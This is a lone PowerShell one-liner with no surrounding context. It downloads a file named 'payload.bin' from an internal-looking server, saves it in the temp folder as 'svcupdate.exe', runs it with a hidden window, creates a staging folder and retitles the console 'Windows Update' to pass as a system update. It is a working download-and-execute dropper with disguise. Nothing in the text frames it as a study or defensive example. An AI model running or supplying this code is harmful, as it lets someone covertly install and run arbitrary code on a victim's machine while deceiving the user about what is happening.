
$PayloadUrl = 'https://internal.corp/downloads/payload.bin'; $PayloadPath = "$env:TEMP\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $PayloadUrl; Start-Process -FilePath $PayloadPath -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
